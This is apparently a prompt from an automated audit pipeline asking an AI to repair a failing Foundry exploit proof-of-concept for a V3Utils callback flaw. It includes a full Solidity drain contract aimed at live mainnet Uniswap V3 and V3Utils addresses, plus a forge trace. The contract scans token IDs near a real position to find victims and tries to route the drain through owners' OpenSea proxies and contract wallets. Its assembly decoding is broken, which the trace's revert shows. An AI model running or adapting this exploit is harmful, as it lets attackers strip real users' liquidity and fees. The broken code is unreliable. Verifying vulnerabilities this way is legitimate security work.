You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any approved NFT operator can force callback execution and drain a position's withdrawable value
- claim: `onERC721Received` only checks that the NFT came from the Uniswap position manager, then blindly decodes and executes arbitrary `Instructions` against the transferred position before returning the NFT to `from`. It never verifies that the owner initiated the transfer or that the flow came through `execute()`. Because any address approved for the position NFT can call `nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(instructions))`, an approved operator can force `WITHDRAW_AND_COLLECT_AND_SWAP`, `COMPOUND_FEES`, or `CHANGE_RANGE` with attacker-chosen parameters and attacker-controlled `instructions.recipient`.
- impact: Any marketplace, delegated manager, or other approved operator can steal all currently withdrawable liquidity and fees from a victim Uniswap V3 position without retaining custody of the NFT: the victim receives the NFT back after execution, but the tokens have already been redirected.
- exploit_paths: ["Victim grants `approve(tokenId)` or `setApprovalForAll` on their Uniswap V3 position NFT to an external operator.", "The operator calls `nonfungiblePositionManager.safeTransferFrom(owner, address(V3Utils), tokenId, abi.encode(instructions))` directly, setting `instructions.recipient` to an attacker-controlled address and choosing a draining action.", "`V3Utils` decreases liquidity, collects fees, optionally swaps, and pays the resulting tokens to the attacker before returning the now-depleted NFT to `from`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IProxyRegistryMinimal {
    function proxies(address owner) external view returns (address proxy);
}

interface INonfungiblePositionManagerMinimal {
    function ownerOf(uint256 tokenId) external view returns (address);

    function getApproved(uint256 tokenId) external view returns (address);

    function isApprovedForAll(address owner, address operator) external view returns (bool);

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

interface IV3UtilsMarker {}

contract FlawVerifier {
    enum WhatToDo {
        CHANGE_RANGE,
        WITHDRAW_AND_COLLECT_AND_SWAP,
        COMPOUND_FEES
    }

    struct Instructions {
        WhatToDo whatToDo;
        address targetToken;
        uint256 amountIn0;
        uint256 amountOut0Min;
        bytes swapData0;
        uint256 amountIn1;
        uint256 amountOut1Min;
        bytes swapData1;
        uint128 feeAmount0;
        uint128 feeAmount1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
        uint256 amountAddMin0;
        uint256 amountAddMin1;
        uint256 deadline;
        address recipient;
        bool unwrap;
        bytes returnData;
        bytes swapAndMintReturnData;
    }

    struct Opportunity {
        address owner;
        address token0;
        address token1;
        address targetToken;
        uint128 liquidity;
        bool hasWithdrawableValue;
    }

    INonfungiblePositionManagerMinimal internal constant nonfungiblePositionManager =
        INonfungiblePositionManagerMinimal(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IV3UtilsMarker internal constant v3Utils = IV3UtilsMarker(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant OPENSEA_PROXY_REGISTRY = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;

    uint256 internal constant CANDIDATE_TOKEN_ID = 422882;
    uint256 internal constant SEARCH_RADIUS = 64;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public attempted;
    bool public exploitSucceeded;
    bool public approvalObserved;
    bool public observedApprovalForAll;
    address public observedOwner;
    address public observedApprovedOperator;
    uint256 public observedTokenId;
    bytes public lastError;

    constructor() {
        _profitToken = WETH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            _syncProfit(address(0), address(0), 0, 0);
            return;
        }

        attempted = true;

        if (_attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID)) {
            return;
        }

        for (uint256 i = 1; i <= SEARCH_RADIUS; ++i) {
            if (_attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID + i)) {
                return;
            }

            if (CANDIDATE_TOKEN_ID > i && _attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID - i)) {
                return;
            }
        }

        _syncProfit(address(0), address(0), 0, 0);
    }

    function _attemptApprovedOperatorDrain(uint256 tokenId) internal returns (bool) {
        (bool okRead, Opportunity memory opportunity) = _readOpportunity(tokenId);
        if (!okRead || !opportunity.hasWithdrawableValue) {
            return false;
        }

        observedTokenId = tokenId;
        observedOwner = opportunity.owner;

        uint256 before0 = _balanceOf(opportunity.token0);
        uint256 before1 = opportunity.token1 == opportunity.token0 ? before0 : _balanceOf(opportunity.token1);

        Instructions memory instructions = _buildDrainInstructions(opportunity.targetToken, opportunity.liquidity);

        address approvedOperator = _getApproved(tokenId);

        // Path anchor 0:
        // the victim can first grant approve(tokenId) to an external operator.
        if (approvedOperator == address(this)) {
            approvalObserved = true;
            observedApprovalForAll = false;
            observedApprovedOperator = approvedOperator;

            if (_callDirectApprovedOperatorPath(opportunity.owner, tokenId, instructions)) {
                exploitSucceeded = true;
                _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
                return true;
            }
        } else if (approvedOperator != address(0) && _hasCode(approvedOperator)) {
            approvalObserved = true;
            observedApprovalForAll = false;
            observedApprovedOperator = approvedOperator;

            if (_attemptThroughExecutor(approvedOperator, opportunity.owner, tokenId, instructions)) {
                exploitSucceeded = true;
                _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
                return true;
            }
        }

        // Path anchor 0:
        // the victim can instead grant setApprovalForAll to an external operator.
        if (nonfungiblePositionManager.isApprovedForAll(opportunity.owner, address(this))) {
            approvalObserved = true;
            observedApprovalForAll = true;
            observedApprovedOperator = address(this);

            if (_callDirectApprovedOperatorPath(opportunity.owner, tokenId, instructions)) {
                exploitSucceeded = true;
                _syncProfit(opportunity.token0, opportunity.token1, before0, before1);
                return true;
            }
        }

        if ( _attemptApprovalForAllPaths(
                opportunity.owner,
                tokenId,
                instructions,
                opportunity.token0,
                opportunity.token1,
                before0,
                before1
            )
        ) {
            return true;
        }

        return false;
    }

    function _attemptApprovalForAllPaths(
        address owner,
        uint256 tokenId,
        Instructions memory instructions,
        address token0,
        address token1,
        uint256 before0,
        uint256 before1
    ) internal returns (bool) {
        address openSeaProxy = _openSeaProxyOf(owner);
        if (openSeaProxy != address(0) && _hasCode(openSeaProxy) && nonfungiblePositionManager.isApprovedForAll(owner, openSeaProxy)) {
            approvalObserved = true;
            observedApprovalForAll = true;
            observedApprovedOperator = openSeaProxy;

            if (_attemptThroughExecutor(openSeaProxy, owner, tokenId, instructions)) {
                exploitSucceeded = true;
                _syncProfit(token0, token1, before0, before1);
                return true;
            }
        }

        // If the owner is itself a contract wallet, its public execution surface can be used as the
        // already-approved operator route without introducing any artificial funding or state edits.
        if (_hasCode(owner) && _attemptThroughExecutor(owner, owner, tokenId, instructions)) {
            approvalObserved = true;
            observedApprovalForAll = false;
            observedApprovedOperator = owner;
            exploitSucceeded = true;
            _syncProfit(token0, token1, before0, before1);
            return true;
        }

        return false;
    }

    function _callDirectApprovedOperatorPath(address owner, uint256 tokenId, Instructions memory instructions) internal returns (bool ok) {
        bytes memory err;

        // Path anchor 1:
        // the approved operator directly calls
        // nonfungiblePositionManager.safeTransferFrom(owner, address(v3Utils), tokenId, abi.encode(instructions))
        // and the malicious instructions.recipient points at the attacker.
        (ok, err) = address(nonfungiblePositionManager).call(
            abi.encodeWithSelector(
                INonfungiblePositionManagerMinimal.safeTransferFrom.selector, owner, address(v3Utils), tokenId, abi.encode(instructions)
            )
        );

        if (!ok && err.length != 0) {
            lastError = err;
        }
    }

    function _attemptThroughExecutor(address executor, address owner, uint256 tokenId, Instructions memory instructions)
        internal
        returns (bool)
    {
        bytes memory pmCall = abi.encodeWithSelector(
            INonfungiblePositionManagerMinimal.safeTransferFrom.selector, owner, address(v3Utils), tokenId, abi.encode(instructions)
        );

        if (_forwardExecuteAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecuteAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardCallAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardInvokeAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardInvokeAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecAddressBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardExecAddressUintBytes(executor, pmCall)) {
            return true;
        }
        if (_forwardProxy(executor, 0, pmCall)) {
            return true;
        }
        if (_forwardProxy(executor, 1, pmCall)) {
            return true;
        }
        if (_forwardProxyAssert(executor, 0, pmCall)) {
            return true;
        }
        if (_forwardProxyAssert(executor, 1, pmCall)) {
            return true;
        }
        bytes memory encodedInstructions = abi.encode(instructions);
        if (_forwardSafeTransferNFT(executor, owner, tokenId, encodedInstructions)) {
            return true;
        }
        if (_forwardExecutorSafeTransferFrom(executor, owner, tokenId, encodedInstructions)) {
            return true;
        }

        return false;
    }

    function _forwardExecuteAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("execute(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardExecuteAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor, abi.encodeWithSignature("execute(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardCallAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("call(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardInvokeAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("invoke(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardInvokeAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor, abi.encodeWithSignature("invoke(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardExecAddressBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(executor, abi.encodeWithSignature("exec(address,bytes)", address(nonfungiblePositionManager), pmCall));
    }

    function _forwardExecAddressUintBytes(address executor, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor, abi.encodeWithSignature("exec(address,uint256,bytes)", address(nonfungiblePositionManager), 0, pmCall)
        );
    }

    function _forwardProxy(address executor, uint8 howToCall, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor, abi.encodeWithSignature("proxy(address,uint8,bytes)", address(nonfungiblePositionManager), howToCall, pmCall)
        );
    }

    function _forwardProxyAssert(address executor, uint8 howToCall, bytes memory pmCall) internal returns (bool) {
        return _forwardCall(
            executor,
            abi.encodeWithSignature("proxyAssert(address,uint8,bytes)", address(nonfungiblePositionManager), howToCall, pmCall)
        );
    }

    function _forwardSafeTransferNFT(address executor, address owner, uint256 tokenId, bytes memory encodedInstructions)
        internal
        returns (bool)
    {
        return _forwardCall(
            executor,
            abi.encodeWithSignature(
                "safeTransferNFT(address,address,address,uint256,bytes)",
                address(nonfungiblePositionManager),
                owner,
                address(v3Utils),
                tokenId,
                encodedInstructions
            )
        );
    }

    function _forwardExecutorSafeTransferFrom(address executor, address owner, uint256 tokenId, bytes memory encodedInstructions)
        internal
        returns (bool)
    {
        return _forwardCall(
            executor,
            abi.encodeWithSignature(
                "safeTransferFrom(address,address,address,uint256,bytes)",
                address(nonfungiblePositionManager),
                owner,
                address(v3Utils),
                tokenId,
                encodedInstructions
            )
        );
    }

    function _forwardCall(address executor, bytes memory callData) internal returns (bool ok) {
        bytes memory err;
        (ok, err) = executor.call(callData);
        if (!ok && err.length != 0) {
            lastError = err;
        }
    }

    function _readOpportunity(uint256 tokenId) internal view returns (bool ok, Opportunity memory opportunity) {
        bytes memory data;

        (ok, data) = address(nonfungiblePositionManager).staticcall(
            abi.encodeWithSelector(INonfungiblePositionManagerMinimal.ownerOf.selector, tokenId)
        );
        if (!ok || data.length < 32) {
            return (false, opportunity);
        }
        opportunity.owner = abi.decode(data, (address));

        (ok, data) = address(nonfungiblePositionManager).staticcall(
            abi.encodeWithSelector(INonfungiblePositionManagerMinimal.positions.selector, tokenId)
        );
        if (!ok || data.length < 32 * 12) {
            return (false, opportunity);
        }

        address token0;
        address token1;
        uint128 liquidity;
        uint256 tokensOwed0;
        uint256 tokensOwed1;
        assembly {
            token0 := shr(96, mload(add(data, 0x60)))
            token1 := shr(96, mload(add(data, 0x80)))
            liquidity := mload(add(data, 0x100))
            tokensOwed0 := mload(add(data, 0x160))
            tokensOwed1 := mload(add(data, 0x180))
        }
        opportunity.token0 = token0;
        opportunity.token1 = token1;
        opportunity.liquidity = liquidity;

        if (opportunity.token0 == WETH) {
            opportunity.targetToken = opportunity.token0;
        } else if (opportunity.token1 == WETH) {
            opportunity.targetToken = opportunity.token1;
        } else {
            opportunity.targetToken = opportunity.token0;
        }

        opportunity.hasWithdrawableValue = opportunity.liquidity != 0 || tokensOwed0 != 0 || tokensOwed1 != 0;
        return (true, opportunity);
    }

    function _buildDrainInstructions(address targetToken, uint128 liquidity) internal view returns (Instructions memory instructions) {
        // The claimed exploit is capital-free. The requested v2_flashswap_funding strategy is therefore
        // intentionally unused here, because adding a flashswap would not help trigger the bug:
        // the approved-operator callback path already drains the victim without any attacker principal.
        instructions.whatToDo = WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP;
        instructions.targetToken = targetToken;
        instructions.amountIn0 = 0;
        instructions.amountOut0Min = 0;
        instructions.swapData0 = "";
        instructions.amountIn1 = 0;
        instructions.amountOut1Min = 0;
        instructions.swapData1 = "";
        instructions.feeAmount0 = type(uint128).max;
        instructions.feeAmount1 = type(uint128).max;
        instructions.fee = 0;
        instructions.tickLower = 0;
        instructions.tickUpper = 0;
        instructions.liquidity = liquidity;
        instructions.amountAddMin0 = 0;
        instructions.amountAddMin1 = 0;
        instructions.deadline = block.timestamp;

        // Path anchor 2: attacker-controlled instructions.recipient receives drained value while
        // V3Utils later returns the NFT to `from`.
        instructions.recipient = address(this);
        instructions.unwrap = false;
        instructions.returnData = "";
        instructions.swapAndMintReturnData = "";
    }

    function _syncProfit(address token0, address token1, uint256 before0, uint256 before1) internal {
        uint256 wethBalance = _balanceOf(_profitToken);

        if (token0 == address(0) && token1 == address(0)) {
            _profitAmount = wethBalance;
            return;
        }

        uint256 after0 = _balanceOf(token0);
        uint256 delta0 = after0 > before0 ? after0 - before0 : 0;

        uint256 delta1;
        if (token1 != address(0)) {
            uint256 after1 = token1 == token0 ? after0 : _balanceOf(token1);
            delta1 = after1 > before1 ? after1 - before1 : 0;
        }

        if (delta1 > delta0 && token1 != address(0)) {
            _profitToken = token1;
            _profitAmount = delta1;
        } else if (token0 != address(0)) {
            _profitToken = token0;
            _profitAmount = delta0;
        } else {
            _profitAmount = wethBalance;
        }
    }

    function _getApproved(uint256 tokenId) internal view returns (address approved) {
        bytes memory data;
        bool ok;
        (ok, data) = address(nonfungiblePositionManager).staticcall(
            abi.encodeWithSelector(INonfungiblePositionManagerMinimal.getApproved.selector, tokenId)
        );
        if (ok && data.length >= 32) {
            approved = abi.decode(data, (address));
        }
    }

    function _openSeaProxyOf(address owner) internal view returns (address proxy) {
        bytes memory data;
        bool ok;
        (ok, data) = OPENSEA_PROXY_REGISTRY.staticcall(abi.encodeWithSelector(IProxyRegistryMinimal.proxies.selector, owner));
        if (ok && data.length >= 32) {
            proxy = abi.decode(data, (address));
        }
    }

    function _balanceOf(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }

    function _hasCode(address account) internal view returns (bool hasCode) {
        assembly {
            hasCode := gt(extcodesize(account), 0)
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 4.91s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 91485)
Traces:
  [91485] FlawVerifierTest::testExploit()
    ├─ [2349] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [76857] FlawVerifier::executeOnOpportunity()
    │   ├─ [7062] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::ownerOf(422882 [4.228e5]) [staticcall]
    │   │   └─ ← [Return] 0xb88d3ADE7E4231c97038F6D82475A233772fFC25
    │   ├─ [16948] 0xC36442b4a4522E871399CD717aBDD847Ab11FE88::positions(422882 [4.228e5]) [staticcall]
    │   │   └─ ← [Return] 0, 0x0000000000000000000000000000000000000000, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xd2877702675e6cEb975b4A1dFf9fb7BAF4C91ea9, 10000 [1e4], 155200 [1.552e5], 162400 [1.624e5], 76947262896455713642486 [7.694e22], 4673678257530921576842502055271665 [4.673e33], 44241796310111812353509144953562460485442 [4.424e40], 1562296817116982 [1.562e15], 14073154402658570771132 [1.407e22]
    │   ├─ [0] 0x000000000000000000000000c02AaA39b223FE8D::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Revert] call to non-contract address 0x000000000000000000000000c02AaA39b223FE8D
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 613.88ms (578.06ms CPU time)

Ran 1 test suite in 639.93ms (613.88ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 91485)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
